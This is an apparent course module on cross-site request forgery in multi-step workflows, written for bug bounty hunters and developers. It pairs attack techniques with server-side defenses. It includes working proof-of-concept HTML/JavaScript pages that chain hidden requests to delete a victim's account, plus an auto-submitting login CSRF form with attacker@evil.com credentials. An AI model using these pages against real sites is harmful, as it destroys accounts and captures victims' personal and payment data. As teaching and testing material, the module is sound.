# CSRF Module 05 — Multi-Step & Stateful Workflows
> **Curriculum:** CSRF Mastery for Ethical Hacking & Bug Bounty  
> **Module:** 05 of 12  
> **Topic:** Workflow Chaining, Login CSRF, Skip-Step Attacks, TOCTOU, Confirmation Dialogs, Secure Workflow Design  
> **Level:** Intermediate-Advanced — applies all prior modules to stateful, multi-request attack scenarios

---

## Table of Contents
- [CSRF Module 05 — Multi-Step \& Stateful Workflows](#csrf-module-05--multi-step--stateful-workflows)
  - [Table of Contents](#table-of-contents)
  - [1. Why Developers Think Multi-Step Workflows Are Safe](#1-why-developers-think-multi-step-workflows-are-safe)
    - [Why This Fails](#why-this-fails)
  - [2. The Chaining Mechanism — How It Actually Works](#2-the-chaining-mechanism--how-it-actually-works)
  - [3. The JavaScript Chain — PoC Construction](#3-the-javascript-chain--poc-construction)
    - [fetch()-Based Chain (Requires Permissive CORS or SameSite=None)](#fetch-based-chain-requires-permissive-cors-or-samesitenone)
    - [Form-Based Sequential Chain (No CORS Requirement)](#form-based-sequential-chain-no-cors-requirement)
  - [4. State Cookie Behavior in Chained Attacks](#4-state-cookie-behavior-in-chained-attacks)
    - [The SameSite Constraint on the Chain](#the-samesite-constraint-on-the-chain)
  - [5. Login CSRF — The Inverted Attack](#5-login-csrf--the-inverted-attack)
    - [The Mechanism](#the-mechanism)
    - [The Login Endpoint Attack](#the-login-endpoint-attack)
    - [Why Login Endpoints Are Often Unprotected](#why-login-endpoints-are-often-unprotected)
    - [Login CSRF + Lax+POST Timing Window Chain](#login-csrf--laxpost-timing-window-chain)
  - [6. Login CSRF Damage Model](#6-login-csrf-damage-model)
    - [Complete Attack Scenarios](#complete-attack-scenarios)
    - [Severity Assessment for Login CSRF](#severity-assessment-for-login-csrf)
  - [7. Skip-Step Attacks — Testing Workflow Integrity](#7-skip-step-attacks--testing-workflow-integrity)
    - [Complete Skip-Step Test Matrix](#complete-skip-step-test-matrix)
  - [8. TOCTOU in Web Workflows](#8-toctou-in-web-workflows)
    - [The Pattern](#the-pattern)
    - [CSRF-Specific TOCTOU Scenario](#csrf-specific-toctou-scenario)
    - [Defense](#defense)
  - [9. Confirmation Dialogs — What They Actually Protect](#9-confirmation-dialogs--what-they-actually-protect)
    - [Client-Side Confirmation (Zero CSRF Protection)](#client-side-confirmation-zero-csrf-protection)
    - [Server-Side Confirmation Token (Actual Protection)](#server-side-confirmation-token-actual-protection)
    - [The Key Rule](#the-key-rule)
  - [10. Client-Side Security Checks — Why They Fail](#10-client-side-security-checks--why-they-fail)
    - [Common Client-Side Checks and Why They Fail](#common-client-side-checks-and-why-they-fail)
    - [The Rule](#the-rule)
  - [11. Workflow ID — The Per-Flow Token Pattern](#11-workflow-id--the-per-flow-token-pattern)
    - [Implementation](#implementation)
    - [Why Attacker's Own Workflow ID Fails](#why-attackers-own-workflow-id-fails)
  - [12. Secure Multi-Step Workflow Design](#12-secure-multi-step-workflow-design)
  - [13. SameSite Interaction with Multi-Step Flows](#13-samesite-interaction-with-multi-step-flows)
  - [14. Impact Scoping for Multi-Step CSRF](#14-impact-scoping-for-multi-step-csrf)
    - [Severity Multiplier: Irreversibility](#severity-multiplier-irreversibility)
    - [Chain Impact vs Single Step Impact](#chain-impact-vs-single-step-impact)
  - [15. Detection Methodology — Workflow-Focused](#15-detection-methodology--workflow-focused)
  - [16. Key Terminology Reference](#16-key-terminology-reference)
  - [17. Common Misconceptions](#17-common-misconceptions)
    - [❌ "Multi-step workflows prevent CSRF"](#-multi-step-workflows-prevent-csrf)
    - [❌ "If Step 1 requires CSRF, the whole workflow is protected"](#-if-step-1-requires-csrf-the-whole-workflow-is-protected)
    - [❌ "Login CSRF is low severity because the attacker can't access the victim's real account"](#-login-csrf-is-low-severity-because-the-attacker-cant-access-the-victims-real-account)
    - [❌ "A confirmation dialog prevents CSRF"](#-a-confirmation-dialog-prevents-csrf)
    - [❌ "document.referrer checks prevent CSRF chaining"](#-documentreferrer-checks-prevent-csrf-chaining)
    - [❌ "Short session timeouts prevent workflow CSRF"](#-short-session-timeouts-prevent-workflow-csrf)
    - [❌ "The attacker needs to be able to read the server's response to chain steps"](#-the-attacker-needs-to-be-able-to-read-the-servers-response-to-chain-steps)
  - [18. Bug Bounty Reference](#18-bug-bounty-reference)
    - [High-Value Workflow Targets](#high-value-workflow-targets)
    - [Login CSRF Test Checklist](#login-csrf-test-checklist)
    - [Reporting Multi-Step CSRF](#reporting-multi-step-csrf)
  - [19. Module 5 Summary — What You Must Know Cold](#19-module-5-summary--what-you-must-know-cold)

---

## 1. Why Developers Think Multi-Step Workflows Are Safe

The intuition developers have:
> "An attacker would need to complete Step 1, receive the server response, complete Step 2, receive another response, then complete Step 3 — all in the right order. That coordination barrier makes automation impractical."

### Why This Fails

```
Failure 1 — Sequential HTTP requests are trivially automatable
  JavaScript async/await chains fetch() calls
  Each step fires after previous response arrives
  No meaningful technical barrier to sequencing cross-site requests

Failure 2 — The server's own responses unlock the next step
  After Step 1, server sets flow cookie in victim's browser
  Attacker does not forge the cookie — server provides it
  Browser stores it automatically; attacker triggers the next request

Failure 3 — "Steps" are just HTTP requests
  Browser has no concept of "being inside a workflow"
  Workflow state lives in cookies and session variables
  Both travel automatically with every matching request

Failure 4 — Complexity is not a security control
  Adding steps adds lines of code, not security boundaries
  Each step must be individually protected
  An unprotected step anywhere in the chain is a full bypass
```

---

## 2. The Chaining Mechanism — How It Actually Works

```
┌──────────────────────────────────────────────────────────────────┐
│                  MULTI-STEP CSRF CHAIN                           │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  t=0: Attacker page loads in victim's browser                    │
│                    ↓                                             │
│  t=1: JS fires Step 1 POST /delete/initiate                      │
│       Browser sends: Cookie: session=abc123                      │
│                    ↓                                             │
│  t=2: Server processes Step 1                                    │
│       Server responds: Set-Cookie: delete_flow=initiated         │
│       Browser stores: delete_flow=initiated  ← server set this  │
│                    ↓                                             │
│  t=3: JS detects Step 1 complete (fetch .then())                 │
│       JS fires Step 2 POST /delete/confirm                       │
│       Browser sends: session=abc123; delete_flow=initiated       │
│                    ↓                                             │
│  t=4: Server processes Step 2                                    │
│       Server responds: Set-Cookie: delete_flow=confirmed         │
│       Browser stores: delete_flow=confirmed                      │
│                    ↓                                             │
│  t=5: JS fires Step 3 POST /delete/execute                       │
│       Browser sends: session=abc123; delete_flow=confirmed       │
│                    ↓                                             │
│  t=6: Account permanently deleted                                │
│       Victim still sees attacker's page — no visible change      │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘

KEY INSIGHT: The attacker never forges a cookie value.
The server hands the victim's browser the state tokens
that unlock each subsequent step.
```

---

## 3. The JavaScript Chain — PoC Construction

### fetch()-Based Chain (Requires Permissive CORS or SameSite=None)

```html
<!DOCTYPE html>
<html>
<body>
<script>
async function csrfChain() {

  // Step 1 — Initiate
  const step1 = await fetch("https://app.victim.com/account/delete/initiate", {
    method: "POST",
    credentials: "include"    // sends session cookie
  });
  // Server sets delete_flow=initiated in victim's browser cookie jar

  // Step 2 — Confirm
  const step2 = await fetch("https://app.victim.com/account/delete/confirm", {
    method: "POST",
    credentials: "include",   // sends session + delete_flow=initiated
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "reason=leaving&confirm=true"
  });
  // Server sets delete_flow=confirmed in victim's browser cookie jar

  // Step 3 — Execute
  await fetch("https://app.victim.com/account/delete/execute", {
    method: "POST",
    credentials: "include"    // sends session + delete_flow=confirmed
  });
  // Account deleted — victim sees nothing
}

csrfChain();
</script>
<p>Loading your content, please wait...</p>
</body>
</html>
```

### Form-Based Sequential Chain (No CORS Requirement)

When fetch() is blocked by CORS, use iframe-based sequential form submission:

```html
<!DOCTYPE html>
<html>
<body>

<!-- Step 1 form, targets hidden iframe -->
<form id="step1"
      action="https://app.victim.com/account/delete/initiate"
      method="POST"
      target="hidden_frame"
      style="display:none">
</form>

<!-- Step 2 form -->
<form id="step2"
      action="https://app.victim.com/account/delete/confirm"
      method="POST"
      target="hidden_frame"
      style="display:none">
  <input type="hidden" name="reason" value="leaving">
  <input type="hidden" name="confirm" value="true">
</form>

<!-- Step 3 form -->
<form id="step3"
      action="https://app.victim.com/account/delete/execute"
      method="POST"
      target="hidden_frame"
      style="display:none">
</form>

<!-- Hidden target iframe -->
<iframe name="hidden_frame" style="display:none"></iframe>

<script>
// Submit steps sequentially with delays for server processing
document.getElementById("step1").submit();

setTimeout(function() {
  document.getElementById("step2").submit();
}, 1500);

setTimeout(function() {
  document.getElementById("step3").submit();
}, 3000);
</script>

</body>
</html>
```

**Limitation:** Form-based chain uses timing delays rather than response detection. Less reliable but does not require reading cross-origin responses.

---

## 4. State Cookie Behavior in Chained Attacks

This is the mechanism most developers misunderstand.

```
QUESTION: How does the attacker get the flow cookie?
ANSWER:   They don't. The server gives it to the victim's browser.

Step 1 response from server:
  HTTP/1.1 200 OK
  Set-Cookie: delete_flow=initiated; Max-Age=300; HttpOnly; SameSite=Lax

Browser behavior:
  Receives Set-Cookie from app.victim.com
  Stores cookie for domain app.victim.com
  This is a SAME-SITE SET operation — SameSite does not restrict this

SameSite only restricts OUTGOING cross-site cookie sending.
SameSite does NOT restrict a site from setting cookies in response to a request.

Result:
  delete_flow=initiated is now in the browser's cookie jar for app.victim.com
  When Step 2 fires TO app.victim.com, this cookie is a candidate for sending
  Whether it sends depends on SameSite + request type of Step 2
```

### The SameSite Constraint on the Chain

```
If delete_flow cookie has SameSite=Lax:
  Step 2 is a cross-site POST → cookie NOT sent
  Chain breaks at Step 2

If delete_flow cookie has SameSite=None:
  Step 2 cross-site POST → cookie IS sent
  Chain continues

If all steps use GET (top-level navigation):
  SameSite=Lax allows cookies
  Chain works via sequential redirects
```

---

## 5. Login CSRF — The Inverted Attack

Standard CSRF targets an authenticated user. Login CSRF targets an unauthenticated user and forces them to authenticate as the attacker.

### The Mechanism

```
Normal CSRF flow:
  Victim authenticated → attacker causes action in victim's session

Login CSRF flow:
  Victim NOT authenticated → attacker causes victim to log in as attacker
  Victim believes they are logged into their own account
  All victim actions occur in the attacker's account context
```

### The Login Endpoint Attack

```http
POST /login
Content-Type: application/x-www-form-urlencoded

username=attacker@evil.com&password=known_attacker_password
```

PoC:
```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://app.victim.com/login"
        method="POST"
        style="display:none">
    <input type="hidden" name="username" value="attacker@evil.com">
    <input type="hidden" name="password" value="attacker_password">
  </form>
  <p>Verifying your account...</p>
</body>
</html>
```

### Why Login Endpoints Are Often Unprotected

```
Developer reasoning:
  "CSRF protection is for authenticated endpoints"
  "There's no session to protect before login"
  "The login form is public — anyone can see it"

Why this is wrong:
  CSRF on login doesn't steal a session
  It CREATES a session under attacker's identity
  The act of session creation is itself exploitable
```

### Login CSRF + Lax+POST Timing Window Chain

```
Step 1: Force victim to log into victim's real account (Login CSRF)
        OR force victim to log in fresh (re-authentication scenario)
        ↓
Step 2: Session cookie set — Lax+POST 2-minute window begins
        (only if cookie lacks explicit SameSite attribute)
        ↓
Step 3: Immediately trigger sensitive POST action
        Cookie sent during timing window
        ↓
Step 4: Action executes despite Lax default
```

---

## 6. Login CSRF Damage Model

### Complete Attack Scenarios

```
SCENARIO 1 — Personal Data Harvesting
  Victim forced to log in as attacker
  Victim fills in shipping address, phone, DOB, preferences
  Data stored in attacker's account
  Attacker retrieves it later

SCENARIO 2 — Payment Method Theft
  Victim adds credit/debit card to "their" account
  Card saved under attacker's account profile
  Attacker uses victim's saved payment method for purchases

SCENARIO 3 — Identity Data Capture
  Victim completes KYC (Know Your Customer) verification
  Uploads ID documents, selfie, address proof
  All stored in attacker's account
  Attacker may be able to impersonate victim

SCENARIO 4 — OAuth Account Linking
  Victim connects their Google/Apple/Facebook account
  to what they think is their account
  Attacker's account now linked to victim's OAuth identity
  Attacker logs in via OAuth → accesses victim's other connected services

SCENARIO 5 — Activity History Exposure
  Victim performs sensitive searches, views medical info,
  makes financial queries under attacker's account
  Attacker reads full activity history later

SCENARIO 6 — Session Fixation Bridge
  Force login establishes session on attacker's account
  If attacker can monitor that session (network position, shared device)
  Real-time visibility into victim's actions
```

### Severity Assessment for Login CSRF

| Application Type | Login CSRF Impact | Severity |
|-----------------|-------------------|----------|
| Banking/Financial | Payment method theft, transaction history | High |
| Healthcare | Medical record exposure, KYC documents | High/Critical |
| E-commerce | Payment data, address, purchase history | High |
| Social platform | Contact list, messages, private content | Medium/High |
| General SaaS | Preferences, usage patterns | Low/Medium |

---

## 7. Skip-Step Attacks — Testing Workflow Integrity

Multi-step workflows must enforce sequence. Test whether each step validates that prior steps were completed.

### Complete Skip-Step Test Matrix

```
For a 3-step workflow (Step 1 → Step 2 → Step 3):

TEST 1: Direct access to Step 2 (skip Step 1)
  POST /workflow/confirm
  (without having done /workflow/initiate)
  Expected: 400/403 — no flow state exists
  Vulnerable: 200 OK — step executes without initiation

TEST 2: Direct access to Step 3 (skip Steps 1 and 2)
  POST /workflow/execute
  (without any flow cookies or state)
  Expected: 400/403
  Vulnerable: 200 OK — action executes with no prior steps

TEST 3: Skip Step 2 (do Step 1, then Step 3)
  Complete Step 1 → immediately attempt Step 3
  Expected: 400/403 — Step 2 state not present
  Vulnerable: 200 OK — Step 2 not enforced

TEST 4: Replay Step 3 after completion
  Complete full workflow → capture Step 3 request → replay
  Expected: 400/403 — flow token already used
  Vulnerable: 200 OK — duplicate execution

TEST 5: Parallel flow injection
  Initiate two flows simultaneously
  Complete one, use the other's state for a different user
  Expected: Flow tokens bound to originating session
  Vulnerable: Flow tokens accepted cross-session

TEST 6: Flow state from different session
  Attacker completes Step 1 in their own session
  Attempts to use attacker's flow token in victim's request
  Expected: Token tied to session → rejected
  Vulnerable: Token accepted regardless of session
```

---

## 8. TOCTOU in Web Workflows

TOCTOU (Time of Check, Time of Use) vulnerabilities occur when conditions checked at one step differ from conditions at execution.

### The Pattern

```
Step 1 (Time of Check):
  Server validates: Is user eligible? Does user have permission?
  Server creates flow state based on checked conditions
  Flow cookie/token issued

[Time passes — state may change]

Step N (Time of Use):
  Server executes action
  Does NOT re-validate original conditions
  Acts on state captured at Step 1
```

### CSRF-Specific TOCTOU Scenario

```
t=0: Attacker triggers Step 1 for victim
     Server checks: user is authenticated, has permission
     Flow token issued

t=1 to t=N: Victim logs out, permission revoked, account suspended

t=N: Attacker triggers Step 3 (execute)
     Server checks: is flow token valid? YES (was valid at t=0)
     Server executes action based on permissions checked at t=0
     Action executes despite changed conditions
```

### Defense

```
Re-validate ALL critical conditions at execution (final step):
  ✓ Is user still authenticated?
  ✓ Does user still have required permission?
  ✓ Is the target resource still in the expected state?
  ✓ Has the flow token been used before? (single-use enforcement)
  ✓ Is the flow token still within its validity window?

Never assume conditions from Step 1 are still valid at Step N.
```

---

## 9. Confirmation Dialogs — What They Actually Protect

### Client-Side Confirmation (Zero CSRF Protection)

```javascript
// Native browser dialog
if (!confirm("Are you sure you want to delete your account?")) {
  return;
}
form.submit();
```

```
What this protects:
  ✓ Accidental clicks by legitimate user

What this does NOT protect:
  ✗ CSRF — attacker calls form.submit() directly, bypassing dialog entirely
  ✗ The dialog runs client-side in the attacker's page context
  ✗ Attacker simply omits the confirmation logic from their PoC
```

```javascript
// Custom modal/popup confirmation
showConfirmationModal({
  message: "Delete your account?",
  onConfirm: () => submitDeletionForm()
});
```

```
Same result — client-side gate, zero CSRF protection
Attacker calls submitDeletionForm() directly without showing modal
```

### Server-Side Confirmation Token (Actual Protection)

```
Correct implementation:
  Step 1: Server renders confirmation page
  Step 2: Server generates confirmation_token, stores in session
          Embeds in confirmation page form:
          <input type="hidden" name="confirmation_token" value="r8x2k9...">
  Step 3: Execution endpoint validates confirmation_token
          Token must match session-stored value
          Token must be single-use

Why this works:
  ✓ Attacker cannot read the confirmation page (SOP)
  ✓ Attacker cannot forge the confirmation_token
  ✓ Even if attacker bypasses the UI, the server rejects the request
```

### The Key Rule

```
Client-side check  → zero CSRF protection
Server-side token  → real CSRF protection

A confirmation that lives only in JavaScript provides no server-side guarantee.
Only a token that the server generates, stores, and validates provides protection.
```

---

## 10. Client-Side Security Checks — Why They Fail

Any security check that runs in JavaScript on the client is bypassable because the attacker controls which requests to send — they do not need to navigate through the application's UI.

### Common Client-Side Checks and Why They Fail

```
CHECK: document.referrer validation
  if (!document.referrer.includes("victim.com")) { redirect(); }

WHY IT FAILS:
  1. Runs on the page being protected, not before the request
  2. Attacker forges the final request directly — never loads this page
  3. document.referrer can be suppressed:
     <meta name="referrer" content="no-referrer">
  4. Cannot be set by attacker (browser-controlled) but CAN be absent
  5. A check that redirects on absent Referer breaks legitimate users
     (HTTPS→HTTP transitions strip Referer legitimately)

CHECK: Custom header validation in JavaScript
  if (!request.headers["X-Custom-Header"]) { reject(); }

WHY IT FAILS:
  Client-side JS cannot enforce server-side request requirements
  The check must be on the SERVER, not in client JS

CHECK: JavaScript-based CSRF token generation
  const token = generateToken();
  document.getElementById("csrf").value = token;

WHY IT FAILS:
  If token is generated client-side without server validation,
  attacker can generate the same token using the same algorithm
  Token must be server-generated and server-validated

CHECK: window.opener / window.parent checks
  if (window.opener) { /* came from another page */ }

WHY IT FAILS:
  Doesn't prevent direct requests
  Doesn't validate the request itself
  Easily bypassed by crafting requests without window context
```

### The Rule

```
Security checks must be SERVER-SIDE to be effective.
Client-side checks protect UX, not security.
Treat all client-side validation as non-existent from a security perspective.
```

---

## 11. Workflow ID — The Per-Flow Token Pattern

A workflow ID is a per-flow CSRF token that also enforces sequence continuity.

### Implementation

```python
# Step 1 — Initiation handler (server-side)
def delete_initiate(request):
    # Validate CSRF token first
    validate_csrf_token(request)
    
    # Generate cryptographically random workflow ID
    workflow_id = secrets.token_urlsafe(32)
    
    # Store in session, bound to this user
    request.session["delete_workflow"] = {
        "id": workflow_id,
        "step": 1,
        "created_at": time.time(),
        "expires_at": time.time() + 300,  # 5 minutes
        "used": False
    }
    
    # Embed in confirmation page
    return render("confirm_deletion.html", {
        "workflow_id": workflow_id
    })

# Step 2 — Confirmation handler
def delete_confirm(request):
    workflow = request.session.get("delete_workflow")
    
    # Validate workflow exists in THIS session
    if not workflow:
        return error(400, "No active workflow")
    
    # Validate workflow ID matches
    if request.POST["workflow_id"] != workflow["id"]:
        return error(403, "Invalid workflow ID")
    
    # Validate not expired
    if time.time() > workflow["expires_at"]:
        return error(400, "Workflow expired")
    
    # Validate correct step
    if workflow["step"] != 1:
        return error(400, "Invalid workflow state")
    
    # Advance state
    request.session["delete_workflow"]["step"] = 2
    
    return render("final_confirmation.html", {
        "workflow_id": workflow["id"]  # pass to step 3
    })

# Step 3 — Execution handler
def delete_execute(request):
    workflow = request.session.get("delete_workflow")
    
    if not workflow or workflow["step"] != 2:
        return error(403, "Invalid workflow state")
    
    if workflow["used"]:
        return error(403, "Workflow already used")
    
    # Require re-authentication
    if not verify_password(request.user, request.POST["password"]):
        return error(403, "Authentication required")
    
    # Mark as used BEFORE executing (prevents race condition)
    request.session["delete_workflow"]["used"] = True
    
    # Execute the action
    delete_user_account(request.user)
```

### Why Attacker's Own Workflow ID Fails

```
Attacker action:
  1. Attacker logs into their own account
  2. Attacker completes Step 1 → gets workflow_id = "attacker_flow_abc"
  3. Attacker embeds "attacker_flow_abc" in forged Step 2 for victim

Server validation:
  received: workflow_id = "attacker_flow_abc"
  session["delete_workflow"]["id"] = "victim_flow_xyz"  ← victim's session
  "attacker_flow_abc" ≠ "victim_flow_xyz" → REJECTED

The workflow ID is meaningless without the session that generated it.
```

---

## 12. Secure Multi-Step Workflow Design

```
┌──────────────────────────────────────────────────────────────────┐
│             SECURE MULTI-STEP WORKFLOW — FULL DESIGN             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  STEP 1 — INITIATION                                             │
│  ├── Require CSRF token (prevents forging initiation)            │
│  ├── Validate user eligibility                                   │
│  ├── Generate cryptographically random workflow_id               │
│  ├── Store in session: {id, step=1, created, expires, used=false}│
│  └── Embed workflow_id in rendered confirmation page             │
│                                                                  │
│  STEP 2 — CONFIRMATION                                           │
│  ├── Validate workflow_id matches session-stored value           │
│  ├── Validate workflow has not expired                           │
│  ├── Validate workflow is at correct step (step == 1)            │
│  ├── Validate workflow has not been used                         │
│  ├── Advance step counter (step = 2)                             │
│  └── Re-embed workflow_id for step 3                             │
│                                                                  │
│  STEP 3 — EXECUTION                                              │
│  ├── Validate workflow_id matches session-stored value           │
│  ├── Validate workflow is at correct step (step == 2)            │
│  ├── Validate workflow has not expired                           │
│  ├── Validate workflow has not been used                         │
│  ├── Require re-authentication (password or OTP/TOTP)            │
│  ├── Mark workflow as used BEFORE executing action               │
│  ├── Re-validate user eligibility (defend against TOCTOU)        │
│  └── Execute action                                              │
│                                                                  │
│  ALL STEPS                                                       │
│  ├── SameSite=Lax or Strict on all cookies                       │
│  ├── Short expiration on flow state (5-10 minutes max)           │
│  ├── Single-use enforcement (used=true after any completion)     │
│  ├── Session binding (flow tokens invalid outside their session) │
│  └── Rate limiting on initiation (prevent flow spam)             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 13. SameSite Interaction with Multi-Step Flows

```
SAMESITE=STRICT + MULTI-STEP WORKFLOW:
  Cross-site requests never carry session cookie
  Attacker cannot trigger Step 1 (no session = server rejects)
  Chain never starts
  Complete protection — but UX cost

SAMESITE=LAX + MULTI-STEP WORKFLOW (POST steps):
  Cross-site POST blocked by Lax
  Chain fails unless:
    → Timing window active (cookies without explicit SameSite)
    → Any step accepts GET (Lax navigation exception)
    → Login CSRF used to establish fresh session within timing window

SAMESITE=NONE + MULTI-STEP WORKFLOW:
  Cross-site POST carries cookies
  JS chain via fetch() with credentials: include works fully
  Full workflow CSRF exploitable
  Application must rely entirely on CSRF tokens and workflow IDs

SAMESITE=LAX + GET STEPS:
  If any step accepts GET (top-level navigation)
  That step is bypasses Lax protection
  Sequential meta-refresh chain can drive the workflow:
    <meta refresh> → Step 1 → redirect → Step 2 → redirect → Step 3
```

---

## 14. Impact Scoping for Multi-Step CSRF

### Severity Multiplier: Irreversibility

Multi-step workflows often gate irreversible actions. CSRF on irreversible actions is always higher severity.

```
Reversible action:
  Change notification preferences → Low
  Force account deletion → Critical (irreversible)

The multi-step nature often signals HIGH VALUE TARGET:
  Developers add steps precisely because the action is sensitive
  CSRF on a 3-step account deletion = Critical
  CSRF on a 1-step preference change = Low
```

### Chain Impact vs Single Step Impact

```
Single-step CSRF on /transfer:
  One transfer executed
  Direct financial loss

Multi-step CSRF chain on /transfer/initiate → /transfer/confirm → /transfer/execute:
  If all three forgeable: same impact as single-step
  If chain requires workflow_id: attacker must first get victim to Step 1
  Partial chain (only Step 1 forgeable): disruption, not execution

Report both:
  1. Which steps are individually forgeable
  2. Whether the full chain is achievable
  3. What is the worst-case achieved impact
```

---

## 15. Detection Methodology — Workflow-Focused

```
STEP 1 — Map the workflow
  Identify all steps (initiation, confirmation, execution)
  Note HTTP methods for each step
  Note cookies set by each step's response
  Note parameters required at each step

STEP 2 — Test each step individually for CSRF
  For each step:
    Is there a CSRF token? (if absent: note as potentially vulnerable)
    What are the cookie attributes?
    Can this step be triggered cross-site?

STEP 3 — Test skip-step vulnerabilities
  Attempt Step 2 without completing Step 1
  Attempt Step 3 without completing Steps 1 and 2
  Attempt Step 3 after completing Step 1 only
  Attempt replay of final step

STEP 4 — Test workflow ID / flow token binding
  Complete workflow as attacker, capture attacker's flow token
  Attempt to use attacker's token in victim's session requests
  If accepted: flow tokens not session-bound

STEP 5 — Test login CSRF
  Attempt to force login via forged POST to /login
  Check if login endpoint has CSRF token
  If no CSRF token: document login CSRF possibility

STEP 6 — Assess chainability
  If individual steps are CSRF-vulnerable:
    Can they be chained via JS fetch() chain?
    Can they be chained via form submission + timing delays?
    Are all steps POST? (check timing window)
    Are any steps GET? (check navigation chain)

STEP 7 — Check for client-side security checks
  Look for document.referrer checks
  Look for JS-based confirmation gates
  Look for client-side token generation
  All are bypassable — document as false sense of security

STEP 8 — Assess re-authentication on final step
  Does execution require current password / OTP?
  If not: full chain is exploitable without victim knowledge
  If yes: chain is limited — note partial CSRF impact
```

---

## 16. Key Terminology Reference

| Term | Definition |
|------|------------|
| **Multi-step CSRF** | CSRF attack that chains multiple sequential requests to complete a workflow |
| **Login CSRF** | CSRF attack on unauthenticated login endpoint; forces victim to authenticate as attacker |
| **Workflow ID** | Per-flow cryptographic token proving sequence continuity; embeds session binding |
| **Skip-step attack** | Accessing a later workflow step without completing prior steps |
| **TOCTOU** | Time of Check, Time of Use — conditions validated at Step 1 may differ at Step N |
| **Confirmation dialog** | Client-side UI gate; provides zero CSRF protection |
| **Server-side confirmation token** | Token generated and validated server-side; actual CSRF protection |
| **Flow cookie** | Cookie set by server to track workflow state across multiple requests |
| **Single-use token** | Token invalidated after first use; prevents replay attacks |
| **Re-authentication** | Requiring credential verification at execution step; prevents completion even if chain is forged |
| **Chain timing** | Sequential execution of workflow steps with delays for server processing |
| **Session binding** | Flow token valid only within the session that created it |
| **Ambient authority** | Browser automatically sends cookies — the mechanism exploited in all CSRF including chains |

---

## 17. Common Misconceptions

### ❌ "Multi-step workflows prevent CSRF"
**Wrong.** Each step is an independent HTTP request. All steps can be chained via JavaScript. The server's own responses set the state cookies that unlock subsequent steps — no forgery required.

### ❌ "If Step 1 requires CSRF, the whole workflow is protected"
**Wrong.** Each step must be individually protected. If Step 1 has a CSRF token but Step 2 does not, an attacker who can somehow reach Step 2 directly (skip-step) can forge it. Defense must be consistent across all steps.

### ❌ "Login CSRF is low severity because the attacker can't access the victim's real account"
**Wrong.** Login CSRF's damage is data the victim submits while unknowingly authenticated as the attacker. On applications with payment methods, identity verification, or sensitive data entry, this can be Critical.

### ❌ "A confirmation dialog prevents CSRF"
**Wrong.** Client-side confirmation (JS dialogs, modals) runs in the browser and can be bypassed entirely by calling form.submit() directly. Only server-side confirmation tokens provide real protection.

### ❌ "document.referrer checks prevent CSRF chaining"
**Wrong.** The check runs client-side. The attacker forges the final request directly without navigating through pages containing the check. The check is simply never encountered.

### ❌ "Short session timeouts prevent workflow CSRF"
**Partially right.** Short timeouts reduce the attack window but don't eliminate it. If the victim is active, their session is typically extended. CSRF tokens and workflow IDs are the correct defense.

### ❌ "The attacker needs to be able to read the server's response to chain steps"
**Wrong for form-based chains.** Sequential form submissions with timing delays can chain steps without reading responses. The server's Set-Cookie headers are processed by the browser automatically — the attacker doesn't need to read them.

---

## 18. Bug Bounty Reference

### High-Value Workflow Targets

```
Account deletion / deactivation workflows
Password change workflows
Email change workflows
Payment/transfer authorization workflows
Administrative privilege escalation workflows
OAuth authorization flows
Account recovery / password reset initiation
Two-factor authentication enrollment/removal
API key generation workflows
Data export / account download workflows
```

### Login CSRF Test Checklist

```
1. Navigate to /login while already logged in elsewhere
2. Inspect login form for CSRF token
   → Absent: login CSRF possible
3. Build PoC: auto-submit form with attacker credentials
4. Verify: victim's browser is now logged in as attacker
5. Assess: what data would victim expose using the application?
6. Check: does logging out clear the attacker's session properly?
7. Document full damage model for the specific application type
```

### Reporting Multi-Step CSRF

```markdown
## Title
CSRF chain in [workflow name] allows [complete action] without victim interaction

## Steps Vulnerable
- Step 1 (/initiate): No CSRF token — forgeable via cross-site POST
- Step 2 (/confirm): No CSRF token — forgeable, flow cookie set by Step 1 response
- Step 3 (/execute): No CSRF token or re-authentication — forgeable

## Chain Achievability
All three steps are forgeable when [SameSite=None / timing window condition].
The server sets flow cookies in Step 1 and Step 2 responses automatically —
the attacker does not need to forge cookie values.

## Impact Chain
Attacker hosts malicious page
  ↓
Victim loads page while authenticated to [target]
  ↓
JS chain fires Steps 1, 2, 3 sequentially
  ↓
[Specific irreversible action] completes
  ↓
[Worst-case consequence]

## Severity: [Critical/High]
[Justify based on irreversibility and impact]

## Remediation
1. Add CSRF token to all three steps
2. Implement per-flow workflow ID (server-generated, session-bound, single-use)
3. Require re-authentication (password/OTP) at execution step
4. Set SameSite=Lax explicitly on all cookies
5. Enforce step sequencing server-side (reject skip-step requests)
6. Set short expiration on flow state (5 minutes maximum)
```

---

## 19. Module 5 Summary — What You Must Know Cold

```
MULTI-STEP CHAINING:
✓ Each step is an independent HTTP request — all are individually forgeable
✓ Server sets flow cookies in its own responses — attacker never forges them
✓ JS fetch() chains steps using async/await + credentials: include
✓ Form-based chains use timing delays when response reading is blocked
✓ Complexity is not a security control — each step must be independently protected

LOGIN CSRF:
✓ Targets unauthenticated login endpoint
✓ Forces victim to authenticate as attacker
✓ Victim submits data (payments, addresses, documents) into attacker's account
✓ Damage model: any data victim submits while unknowingly logged in as attacker
✓ Defense: CSRF token on login form (often omitted in frameworks)

SKIP-STEP ATTACKS:
✓ Test direct access to every step without completing prior steps
✓ Test replay of final step after completion
✓ Test flow tokens across different sessions (session binding validation)

TOCTOU:
✓ Conditions checked at Step 1 may differ at Step N
✓ Re-validate all critical conditions at execution step
✓ Single-use token enforcement prevents replay

CONFIRMATION DIALOGS:
✓ Client-side confirmation = zero CSRF protection
✓ Attacker bypasses UI entirely by calling submit() directly
✓ Only server-side confirmation tokens provide real protection

SECURE WORKFLOW DESIGN:
✓ Step 1: CSRF token on initiation
✓ Step 2: Server-generated, session-bound, single-use workflow ID
✓ Step 3: Re-authentication (password or OTP)
✓ All steps: short expiration, SameSite=Lax, step-sequence validation

CLIENT-SIDE CHECKS:
✓ document.referrer checks: bypassable (attacker skips the page containing them)
✓ JS modal/dialog gates: bypassable (attacker calls submit() directly)
✓ All client-side security = zero server-side guarantee
```

---

*Next: Module 06 — CSRF Defenses Layer by Layer*  
*Deep dive into synchronizer tokens, SameSite mechanics, double-submit cookies,*
*Origin/Referer validation — each defense analyzed as a trust assertion with its failure modes*